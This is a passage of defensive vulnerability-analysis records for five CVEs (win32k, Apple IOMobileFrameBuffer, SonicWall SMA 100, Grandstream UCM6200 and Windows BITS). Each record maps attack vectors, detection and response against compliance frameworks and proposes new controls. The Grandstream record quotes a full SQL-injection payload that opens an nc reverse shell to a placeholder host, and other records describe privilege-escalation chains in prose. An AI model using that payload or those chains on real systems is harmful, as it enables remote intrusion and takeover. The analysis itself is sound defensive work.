prevention.adequacy: The update is complete for this CVE, and the reboot is the part that decides whether it is deployed or merely installed — the vulnerable win32kfull stays loaded until the restart. Its adequacy as a class response is weaker: this is the second fix on the same primitive after CVE-2021-1732, so 'apply the update' had already been done once against the same technique and had not held.

detection.what_would_have_worked: Alerting on a process token becoming SYSTEM without a matching service start, scheduled-task launch or UAC elevation; on an unprivileged process calling NtUserConsoleControl during window-class allocation; and on win32kfull.sys bugchecks with desktop-heap corruption.
detection.adequacy: Token-integrity telemetry is the only detection that reaches the elevation itself, and it requires an EDR that models token changes rather than only process creation. Everything else is downstream: the technique writes no file, creates no process and loads no driver at the moment of elevation, so a monitoring programme built on the Windows event log alone sees nothing until the operator does something with the token.

response.what_would_have_worked: Treating the host as SYSTEM-compromised: enumerate accounts, services and scheduled tasks created after the suspect process ran, rotate every credential the machine held including machine-account and cached domain credentials, and rebuild rather than clean, since SYSTEM-level access precedes any local evidence the host produces about itself.
response.adequacy: Credential rotation is the load-bearing step because the elevation's value to an attacker is what SYSTEM can read, not the elevation itself. Scoping is hard for the same reason detection is: the elevation leaves no artefact, so the investigation has to work forward from the initial access and backward from the operator's follow-on actions.

NIST-800-53-SI-2.gap: SI-2 closes on remediation being installed, and on Windows the January 2022 cumulative update does not take effect until restart — the vulnerable win32kfull remains loaded until then. A report generated from installation state can show a machine remediated while any interactive user can still take SYSTEM, against a 2022-02-18 due date on hosts whose reboots are scheduled around users.

NIS2-Art21-patch-management.gap: January 2022 reads as an ordinary month against vendor releases. The obligation cannot carry lineage: the CVE-2021-1732 fix allowed SetWindowLong to write kernel memory for console windows, and this CVE reaches it by calling NtUserConsoleControl inside the xxxClientAllocWindowClassExtraBytes callback. An entity that had already remediated CVE-2021-1732 was told the class was closed.

UK-CAF-B2.gap: B2's findings are about accounts — standard users, separate privileged accounts, justified and reviewed privileged access. This CVE turns all of that into an assertion about the win32k desktop heap, because the SYSTEM token is copied onto a process running in an ordinary interactive session. A clean least-privilege assessment describes a boundary the kernel is no longer enforcing.

AU-Essential-8-Patch.gap: CVSS 7.8, AV:L and PR:L place this in the model's slowest band, while CISA gave it fourteen days and flagged known ransomware use, and public exploits including a Metasploit module landed within weeks of the 2022-01-11 fix. The model has no input for a working public exploit released after the patch.

ISO-27001-2022-A.8.16.gap: The elevation is data-only: an out-of-bounds desktop-heap write, a read back through GetMenuBarInfo, and a token copy — no new process, no file, no registry key, no driver. The observable A.8.16 would need is a token change without a legitimate elevation, which is absent from the log sources a monitoring programme normally covers.

new_control_requirements.name: ACTIVELY-EXPLOITED-OS-LPE-REMEDIATION-WINDOW-ENFORCEMENT
new_control_requirements.description: When an OS vendor flags a local-privilege-escalation flaw as exploited in the wild (and it is KEV-listed), the monthly cumulative update that fixes it must be applied and rebooted within the KEV window, and the compliance record must be the reboot, not the installation.
new_control_requirements.evidence: CVE-2022-21882 — fixed in the 2022-01-11 cumulative update, KEV-listed 2022-02-04 with a 2022-02-18 due date, ransomware use flagged Known. There is no workaround and no configuration mitigation for this CVE, so the reboot is the mitigation; a host with the update staged and not restarted still runs the vulnerable win32kfull, and only a control that records the restart distinguishes the two states.

new_control_requirements.name: INCOMPLETE-PATCH-SEQUENCE-SEVERITY-MULTIPLIER
new_control_requirements.description: Vulnerability-management programs must apply a severity multiplier when a CVE is the Nth in an incomplete-patch sequence on the same primitive (third MOTW bypass, second AMSI bypass, and so on).
new_control_requirements.evidence: CVE-2022-21882 — the second bug on the same win32k primitive after CVE-2021-1732, and it works precisely by abusing the exception that fix introduced: SetWindowLong was permitted to write kernel memory for console windows, so the exploit calls NtUserConsoleControl during the xxxClientAllocWindowClassExtraBytes callback to make the window one. CVE-2021-1732 was itself exploited in the wild and KEV-listed, so the multiplier is what turns January 2022 from a routine month into a re-close of a known-hostile primitive.

new_control_requirements.name: KERNEL-EXPLOITATION-DETECTION
new_control_requirements.description: Deploy kernel-privilege-escalation detection rules on hosts and alert within 60 seconds of detection.
new_control_requirements.evidence: CVE-2022-21882 — attached as the closest existing privilege-escalation-telemetry control, noting its description names auditd and eBPF while the platform here is Windows and the equivalent is EDR token-integrity telemetry. The requirement is what matters: the exploit copies the SYSTEM token onto its own process and creates no file, process, registry key or driver at the moment of elevation, so unless the sensor models token changes and an unprivileged NtUserConsoleControl call during window-class allocation, nothing is emitted until the operator acts on the stolen token.

attack_vector.description: IOMobileFrameBuffer's IOKit user client takes a size from user space without validating it adequately and writes out of bounds in kernel memory — Apple's wording is that a memory corruption issue was addressed with improved input validation, and NVD classifies it CWE-787. A process already running on the device, meaning a malicious or compromised application, opens the user client and turns the out-of-bounds write into code execution with kernel privileges, which sits above the application sandbox and above every per-app data boundary the platform enforces.
attack_vector.privileges_required: Local code execution on the device. The CVSS vector reads PR:N and AV:N, but Apple describes the actor as 'a malicious application' — so the real gate is application distribution (App Store, TestFlight, enterprise or MDM signing) or a preceding remote bug that supplies the local execution this one escalates.
attack_vector.complexity: low once local code is running — the public proof of concept in github.com/b1n4r1b01/n-days (IOMFB_oobr_15.2.c) comes from one of the researchers Apple credits. The complexity is entirely in getting code onto the device.
attack_vector.ai_factor: None. Apple credits an anonymous researcher, Meysam Firouzi (@R00tkitSMM) of MBition – Mercedes-Benz Innovation Lab, and Siddharth Aeri (@b1n4r1b01); the work described is manual reverse engineering of IOKit user clients and binary diffing of in-the-wild updates.

prevention.what_would_have_worked: Installing iOS/iPadOS 15.3, macOS Big Sur 11.6.3 or macOS Monterey 12.2 — pushed as an enforced MDM software-update command on a managed fleet rather than left as a user prompt — and controlling which applications can reach the device in the interval, since the exploit needs local code to run at all.
prevention.adequacy: The OS update is complete for this CVE and it is the only fix — Apple had no Rapid Security Response in January 2022, so the smallest available unit of change was a whole OS release with a restart. That is why the two-week due date is hard on user-held hardware, and why application-distribution control is the only lever that exists before the update lands.

detection.what_would_have_worked: Collecting device panic logs through MDM and looking for IOMobileFrameBuffer or graphics-user-client panics on devices below the fixed builds, and reconciling the installed-application inventory against the approved list to find sideloaded or enterprise-signed apps.
detection.adequacy: Weak by platform design. iOS gives the defender almost no visibility into what an application does once installed, so the panic log from a failed attempt is close to the only host artefact available, and a successful exploit produces none. Detection here is mostly inventory work: which devices are unpatched and which applications are on them.

response.what_would_have_worked: Treating a suspected device as fully compromised rather than cleanable: update it, and where there is any evidence of exploitation, wipe and restore from a known-good state, rotate every credential and token the device held, and revoke its certificates and device-trust state.
response.adequacy: Correct because kernel-level code execution defeats the boundaries any lesser remediation would rely on, and expensive because on a personally-owned device the organisation may have neither the authority to wipe nor the visibility to decide whether it needs to. The absence of forensic evidence is not evidence of absence on this platform.

NIST-800-53-SI-2.gap: SI-2 assumes the organisation controls when a fix lands. Apple published 15.3 on 2022-01-26 with a 2022-02-11 KEV due date, the unit of remediation is a whole OS release with a restart, and on user-held devices the install decision belongs to the owner unless an MDM command forces it. The control records an overdue finding against a device the organisation cannot patch on its own authority.

NIS2-Art21-patch-management.gap: The Article's patch framing addresses systems the entity administers. An entity with an exercised process for servers and workstations frequently has no equivalent authority over staff phones and tablets, and the flaw's precondition — a malicious application on the device — is a mobile-estate control the Article does not reach.

UK-CAF-B4.gap: There is no build setting behind this flaw. What matters before the OS update lands is which applications can be installed and from where, and a B4 mobile assessment records encryption, passcode policy and OS version without establishing who can put an application on the device.

AU-Essential-8-Patch.gap: The mitigation's maturity model is written around workstations and servers where the organisation performs the update. On mobile, whether 15.3 installs is decided on the device unless an enforced MDM update command is issued, and the assessment cannot distinguish a device that took 15.3 from one reporting current on a train that no longer receives the fix.

ISO-27001-2022-A.8.8.gap: Identification fails before prioritisation does: personally-owned devices holding corporate data are inside the exposure and outside the asset register. Prioritisation then misreads the flaw, because NVD scores it AV:N/PR:N/UI:N while Apple describes a malicious application as the actor — so a programme working from the vector treats a local kernel escalation as a remote unauthenticated one and reaches for the wrong remediation.

new_control_requirements.name: MOBILE-ENDPOINT-MDM-ENFORCED-KEV-SLA
new_control_requirements.description: DDM-enforced 24h KEV update on mobile estates.
new_control_requirements.evidence: This is the control's exact case. Apple shipped iOS and iPadOS 15.3, macOS Big Sur 11.6.3 and macOS Monterey 12.2 on 2022-01-26; CISA listed the CVE on 2022-01-28 with a 2022-02-11 due date; and the fix is an entire OS release with a restart, because Apple had no Rapid Security Response mechanism at the time. A prompt-the-user update model cannot meet a two-week window on user-held hardware, and there is no smaller unit to deploy. The enforced update command is the only mechanism that converts the KEV date into an on-device build, and verification has to read the resulting build from the device rather than trusting a compliance flag.

new_control_requirements.name: MOBILE-ZERO-CLICK-HARDENING
new_control_requirements.description: High-risk mobile users must operate in a reduced-attack-surface mode (e.g. Lockdown Mode) that disables automatic processing of untrusted message attachments, fonts, and link previews.
new_control_requirements.evidence: Attached as the closest existing control on constraining what can reach code execution on a mobile device, and applied here to the layer before the kernel bug: Apple's description of this CVE is that 'a malicious application may be able to execute arbitrary code with kernel privileges', so the flaw is only reachable once something runs locally. Between the 2022-01-26 release and whenever a given device actually took 15.3, the only available control was over what could run — which applications may be installed, from which distribution channel, and whether sideloaded or enterprise-signed applications outside the approved list are present. The requirement this CVE adds to the control is an inventory of installed applications reconciled against an approved list, since that is the surface the escalation launches from.

CVE-2021-20038.name: SonicWall SMA 100 mod_cgi Pre-Authentication Stack Buffer Overflow

attack_vector.description: An unauthenticated HTTP request to /cgi-bin/staticContent on an SMA 100 appliance with an over-long query string. The appliance's modified mod_cgi concatenates QUERY_STRING into a 400-byte stack buffer with strcat and no length check, and an integer overflow in the following bounds check allows further writes past the stack allocation. Code executes as the nobody user inside the device that terminates the organisation's remote-access VPN.
attack_vector.privileges_required: none - unauthenticated request to the appliance's user-facing web interface
attack_vector.complexity: low - reliability comes from a non-PIE httpd at a predictable base and a prefork worker model that lets an attacker guess addresses across forks, despite full ASLR
attack_vector.ai_factor: None. Found by Rapid7 through manual reverse engineering of the appliance firmware and disclosed with SonicWall in December 2021; no AI tooling credited in discovery or in any reported exploitation.

prevention.what_would_have_worked: Upgrade to firmware 10.2.0.9-41sv or 10.2.1.3-27sv, released 2021-12-07 under SNWLID-2021-0026. Where the appliance is out of support, replace it - there is no configuration-side mitigation, because the vulnerable path is the interface the product exists to expose.
prevention.framework_requiring_it: CISA BOD 22-01 (KEV remediation, added 2022-01-28, due 2022-02-11, ransomware use Known)
prevention.adequacy: Necessary and not sufficient. A device that was reachable and unpatched must be treated as having disclosed its configuration and credentials; the upgrade closes the hole without settling that.

detection.what_would_have_worked: Alert on requests to /cgi-bin/staticContent with anomalous query-string length, and on httpd child crashes on the appliance, forwarded to a SIEM outside the appliance's own trust zone.
detection.adequacy: Only works if the logs left the device before the compromise. An attacker with code execution inside the appliance controls what it reports about itself, which is why the log destination has to be in a different trust zone.

response.what_would_have_worked: Rebuild the appliance from vendor media rather than restoring its configuration backup, rotate local administrator, bound directory-service and brokered user credentials, and scope for the ransomware follow-on CISA's Known flag implies.
response.adequacy: The only defensible path. Restoring the appliance's own configuration restores whatever the attacker changed, and patch-in-place leaves any implant untouched - the shape GTIG's OVERSTEP reporting describes on this device family.

NIST-800-53-SC-7.gap: Boundary protection is satisfied by the presence of the device. That is the whole problem here: the SMA 100 is the boundary, and the vulnerable path is its own web server on the interface it must expose for the product to function. An SC-7 assessment that records a managed interface enforcing the boundary is describing the component that a single unauthenticated HTTP request executes code inside, and there is no configuration of SC-7 that puts a control in front of it.

NIS2-Art21-incident-handling.gap: Incident handling written around a compromised host does not fit an appliance. Code executes as nobody inside a closed firmware image with no operator-installed logging or endpoint agent, so the evidence an Article 21 process expects to collect does not exist, and the correct first action is not containment and eradication on the device but treating its configuration and every credential it brokered as exfiltrated. CISA's own listing carries a ransomware-use flag of Known, so the handling path also has to assume a follow-on encryption stage rather than an isolated intrusion.

UK-CAF-D1.gap: Response and recovery planning covers restoring service after a failure. The recovery this device needs is not restoration - it is rebuild plus credential rotation, because a pre-auth remote code execution on a VPN concentrator invalidates the appliance's stored secrets rather than its availability. A D1 plan that restores the appliance from its own configuration backup restores the compromised configuration, and a plan that measures success by service resumption records success on a device the attacker still holds.

AU-Essential-8-Patch.gap: The Essential Eight's Patch Operating Systems control names internet-facing network devices as the first class it covers, at two weeks from release and 48 hours where an exploit exists, so an internet-terminating SMA 100 sits on the model's fastest rung rather than outside its scope. What the rung assumes is that the update can be taken inside that window. It cannot be taken quietly here: SonicWall shipped the fix on 2021-12-07, CISA set the due date at 2022-02-11, and installing the firmware reboots the appliance and drops every VPN session, with no live-patch path available on a closed firmware image. The 48-hour target therefore lands on a change window that the model requires nobody to have pre-agreed. The same control's rung for the unsupported case - operating systems no longer supported by vendors are replaced - is a state rather than a schedule, and asks for no compensating segmentation while a device awaits removal, which is the entire condition of the end-of-life SMA 100 population GTIG's UNC6148 reporting describes.

ISO-27001-2022-A.8.22.gap: Segregation of networks assumes the segregating device is trustworthy. This appliance straddles the boundary by design - untrusted on one side, internal on the other - so code execution inside it is not a breach of a segment, it is possession of the thing enforcing the segments. An A.8.22 control statement describing the SMA 100 as the segregation mechanism cannot express that the mechanism has an unauthenticated remote code execution path in its own web server.

new_control_requirements.name: PERIMETER-DEVICE-ZERODAY-SLA-TIER
new_control_requirements.description: Perimeter devices (VPN concentrators, gateways) require a separate compressed-SLA tier; XSS on the captive-portal hostname enables credential-phishing from the legitimate brand.
new_control_requirements.evidence: The SMA 100 is exactly the device class this tier exists for, and this CVE is the severe end of it rather than the phishing case the control's description names. SonicWall shipped fixed firmware on 2021-12-07; CISA set the due date at 2022-02-11; exploitation attempts were publicly observed from 2022-01-24. The compressed tier is what makes a firmware upgrade that reboots the device and drops every VPN session a pre-agreed outage slot rather than a change request competing with ordinary patching.

new_control_requirements.name: PERIMETER-COMPROMISE-REBUILD-NOT-PATCH
new_control_requirements.description: Pre-rehearsed IR runbook for any perimeter device that suffers a pre-auth RCE CVE in active exploitation MUST default to config-exfil + rebuild + credential rotation, not patch-in-place.
new_control_requirements.evidence: This is the case the control is written for: unauthenticated code execution inside a VPN concentrator, CISA ransomware-use flag Known, and a device family that GTIG's OVERSTEP reporting shows carrying a persistent rootkit through subsequent operator activity. Patch-in-place leaves an implant untouched and restoring the appliance's own configuration backup restores whatever the attacker changed. The rehearsal matters because the rebuild costs the same VPN outage as the upgrade, so an organisation that has not decided in advance will choose the cheaper action under pressure.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life devices with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal.
new_control_requirements.evidence: GTIG's UNC6148 campaign is specifically against end-of-life SMA 100 appliances, with activity dated back to October 2024 - years after the 2021-12-07 fixed firmware. For an appliance past end of support there is no 10.2.1.3-27sv to install, so the KEV obligation resolves to removal on a dated plan. The compensating measure while the device remains is network-level: restrict who can reach the user-facing interface at all, since the appliance's own web server is the vulnerable component and nothing can be switched off inside it.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: 4h KEV-listing mitigation SLA applies.
new_control_requirements.evidence: CISA listed this on 2022-01-28 with a 2022-02-11 due date and the ransomware-use flag set to Known - the only entry in this batch carrying that flag. EPSS on 2026-08-28 was 0.99912 at the 99.966th percentile, effectively the ceiling. There is no configuration-side action an hours-scale SLA can substitute for the firmware upgrade, so what the SLA has to deliver instead is the decision: take the VPN outage now, or take the appliance off the internet until the window arrives.

CVE-2020-5722.name: Grandstream UCM6200 Forgot-Password Unauthenticated SQL Injection to Root

attack_vector.description: An unauthenticated request to the UCM6200 web interface's Forgot Password function supplies a username that is concatenated into an SQLite query. The injection terminates the query and the supplied content then reaches a shell command line that invokes a Python mail script, so the attacker's command runs as root on the PBX. Tenable's published payload is admin' or 1=1--`;`;nc${IFS}<host>${IFS}<port>${IFS}-e${IFS}/bin/sh`;`;.
attack_vector.privileges_required: none (the vulnerable function exists to serve users who cannot authenticate)
attack_vector.complexity: low - a single HTTP request, with public exploit code from Exploit-DB and a Metasploit module written by the discovering researcher
attack_vector.ai_factor: Not AI-discovered. Tenable credits Jacob Baines; the disclosure timeline of 19 to 23 March 2020 is manual research on the device's web interface.

prevention.what_would_have_worked: Firmware 1.0.20.17 or newer - not 1.0.19.20, which closes the root-shell path and leaves the injection reachable for the email HTML variant - plus removal of the management interface from untrusted networks.
prevention.adequacy: The firmware fix is complete and the network measure is the only thing available before a maintenance window exists, since the update reboots the PBX. A device that was internet-facing while unpatched needs credential rotation as well: the flaw yields root, so SIP credentials, admin passwords and trunk configuration were all readable.

detection.what_would_have_worked: Alert on SQL syntax in password-recovery parameters at the web interface, on the appliance making outbound connections on non-telephony ports, and on password recovery emails containing HTML markup - the last of these is the specific artefact that shows the injection is still reachable on firmware between the two version boundaries.
detection.adequacy: Workable, but it depends on the appliance's logs leaving the appliance. A device where root has been obtained is not a trustworthy source of its own telemetry, so the detection has to be built where the traffic is seen rather than where it is received.

response.what_would_have_worked: Rebuild the appliance from vendor firmware rather than patch it in place, rotate every SIP, extension, admin and trunk credential it held, and audit call routing and recording configuration for changes.
response.adequacy: Correct and rarely done on this class of device, because a PBX rebuild is a telephony outage with a business owner attached. The consequence of skipping it is that the persistence root installed survives the firmware update that closes the CVE.

NIST-800-53-SC-7.gap: Boundary protection is the control that would have prevented every documented path to this flaw, because the vulnerable function is on the appliance's HTTP management interface and nothing else. The gap is that SC-7 is assessed at the network perimeter as designed, and this device is usually placed outside it on purpose: a PBX is deployed to serve remote extensions and remote administration, so the port-forward that exposes it is a deliberate business decision recorded nowhere in the boundary-protection assessment. An organisation can hold a complete and accurate SC-7 implementation whose diagram shows the PBX as an intended external service.

NIS2-Art21-network-security.gap: Network security measures under Article 21 govern segmentation and the protection of network communications, and the appliance in question is itself part of the network estate rather than a host behind it. The flaw turns the telephony platform into an attacker-controlled root shell, from which call routing, SIP credentials and recordings are reachable - the segmentation that Article 21 asks for is typically drawn to protect the corporate network from outside, with the PBX on the trusted side of that line and its own management interface treated as infrastructure rather than as an internet-exposed application.

UK-CAF-B4.gap: System security expects a product to enforce its own input boundary. Here the boundary is a query that concatenates a username into SQL on a path that exists specifically to serve unauthenticated users, so there is no configuration, credential policy or hardening setting an operator can apply that changes the outcome. Tenable published the working payload on 2020-03-23 and Exploit-DB carried code the following day, so from the operator's side the only levers that ever existed were the firmware version and network reachability.

AU-Essential-8-Patch.gap: The Essential Eight patching timeframes are written for operating systems and applications, and firmware on an embedded voice appliance sits awkwardly in both. The vendor released the fix in 2020, CISA set a 2022-07-28 due date, and the practical obstacle is neither: it is that patching this device is a scheduled telephony outage, which the maturity model does not weigh. The model also cannot express the two-boundary structure that decides the outcome, so a fleet reported as patched to 1.0.19.20 scores identically to one on 1.0.20.17 while remaining injectable.

ISO-27001-2022-A.8.8.gap: Technical vulnerability management depends on the organisation receiving the information. NVD carries no vendor advisory reference for this CVE at all - the authoritative technical record is Tenable's research advisory - so an A.8.8 process fed by vendor security feeds may never see it, and an asset register that lists the PBX as telephony equipment rather than as an internet-facing web application will not route it to the team that patches web applications either. Both failures are silent: the register looks complete and the feed looks current.

new_control_requirements.name: DB-ABSTRACTION-LAYER-PARAMETERIZATION-VERIFICATION
new_control_requirements.description: Parameterization must be verified at the database abstraction layer / query builder, not assumed from application-layer input validation or a perimeter WAF.
new_control_requirements.evidence: The injectable query here sits on the Forgot Password path, which is the one path that must accept input from someone who cannot authenticate, so every application-layer assumption about who the caller is fails by design. Tenable's payload, admin' or 1=1-- followed by shell metacharacters, is the standard shape a WAF signature is written for, which is exactly why a WAF verdict is not the evidence this control asks for - the same parameter also reaches a shell command line, so neutralising it at the query layer alone is necessary but the argv boundary needs proving too. For an appliance the verification is a vendor question rather than a code-review one: the operator's version of this control is to require the vendor to state where parameterization is enforced, and failing that, to treat the interface as untrusted at the network layer.

new_control_requirements.name: UNSUPPORTED-NETWORK-DEVICE-ENUMERATION-AND-RETIREMENT
new_control_requirements.description: Every network-attached embedded device (IP cameras, video servers, NVRs, routers, print/scan appliances) must carry an end-of-support date in the asset inventory, and any device past it must be isolated or replaced.
new_control_requirements.evidence: The remediation for this CVE is firmware 1.0.20.17, which only exists for units the vendor still publishes firmware for. A UCM6200-series device past end of support cannot reach that version, so the 2022-07-28 KEV due date is unmeetable by patching and the honest state is replacement. The inventory requirement is what makes that visible before the disclosure rather than after: this appliance is typically recorded as telephony equipment, which is why NVD carrying no vendor advisory reference for the id is so costly - nothing in the normal flow connects a voice asset to a web-application CVE with public exploit code.

new_control_requirements.name: PERIMETER-COMPROMISE-REBUILD-NOT-PATCH
new_control_requirements.description: Pre-rehearsed IR runbook for any perimeter or internet-facing device that suffers a pre-auth RCE CVE in active exploitation MUST default to config-exfil review plus rebuild plus credential rotation, not patch-in-place.
new_control_requirements.evidence: Root on a UCM6200 is root on the telephony platform: SIP and extension credentials, trunk configuration, call routing and recordings are all reachable, and persistence written to the appliance filesystem survives the firmware upgrade that closes the CVE. Exploit code has been public since 2020-03-24 and the device class is routinely internet-facing, so for any unit that was reachable while below 1.0.19.20 the defensible default is rebuild from vendor firmware plus rotation, not the upgrade alone. The runbook needs writing in advance here specifically because the rebuild is a telephony outage with a business owner who will ask for it to be deferred.

CVE-2020-0787.name: Windows BITS Symbolic Link Arbitrary File Move to SYSTEM (CVE-2020-0787)

attack_vector.description: A local user creates a BITS job, forces the service's state-recovery path, and redirects the resulting file operation with an NTFS junction or object-manager symbolic link. Because BITS obtains the job-group handle without properly impersonating the caller, the move executes as LocalSystem. The public exploit chains it by overwriting C:\Windows\System32\WindowsCoreDeviceInfo.dll and triggering a DLL hijack in the Update Session Orchestrator Service, giving code execution as SYSTEM.
attack_vector.privileges_required: any local user account - no administrative rights and no group membership
attack_vector.complexity: low given a foothold - the exploit forces the recovery path deliberately rather than racing it, and the Metasploit port is rated Excellent and crash-safe on x86 and x64
attack_vector.ai_factor: None. Found by itm4n through manual reverse engineering of an undocumented BITS COM interface.

prevention.what_would_have_worked: Install the 2020-03-10 cumulative update for the Windows release in use, or any later cumulative that supersedes it, and reboot. There is no configuration alternative - BITS cannot be disabled in an estate that uses Windows Update or SCCM.
prevention.adequacy: Complete, and superseded monthly - any host current on Windows cumulative updates is fixed. The failure mode is not partial protection but deferral, which the vendor's own 'Exploitation Less Likely' rating invited.

detection.what_would_have_worked: Alert on junction or object-manager symlink creation by a standard user followed by a change to a file under System32, and on WindowsCoreDeviceInfo.dll diverging from the servicing-store copy.
detection.adequacy: Effective against the published chain specifically. The underlying primitive is an arbitrary file move, so a different target file defeats a detection written only around WindowsCoreDeviceInfo.dll - the durable signal is the junction-then-System32-write sequence.

response.what_would_have_worked: Treat a confirmed hit as full host compromise at SYSTEM, rebuild rather than clean, and rotate every credential and cached token the host held.
response.adequacy: Necessary. CISA records ransomware use as Known for this CVE, so the plausible follow-on to SYSTEM on one host is deployment across the ones it can reach.

NIST-800-53-AC-6.gap: Least privilege is the control that assumes a standard user account bounds what an attacker can do, and this CVE is the counterexample stated plainly: any local user, at any privilege level, obtains a file move executing as LocalSystem and, through the WindowsCoreDeviceInfo.dll and Update Session Orchestrator chain, code execution as SYSTEM. Removing local administrator rights - the single most common AC-6 implementation and the thing an assessment measures - changes nothing about the exploit's preconditions, because BITS performs the operation on behalf of whoever queued the job.

NIS2-Art21-patch-management.gap: Patch management prioritises by the severity and exploitability information available at the time. Microsoft published this on 2020-03-10 with exploited recorded as 'No' and an exploitability assessment of 'Exploitation Less Likely' for both current and older releases, and that assessment has never been revised. CISA listed it as known-exploited on 2022-01-28 with ransomware use Known. An operator whose deferral decisions in 2020 followed the vendor's own exploitability index deferred correctly by the process and wrongly by the outcome, and nothing in the obligation re-opens a closed prioritisation decision when a KEV listing later contradicts it.

UK-CAF-B2.gap: B2 covers identity and access control, and the identity model is not where this fails: the attacker uses their own legitimate account and asks BITS to do something it is designed to do for users. The defect is that the service obtains the job-group handle without properly impersonating the caller, so the operation runs with the service's token rather than the requester's.
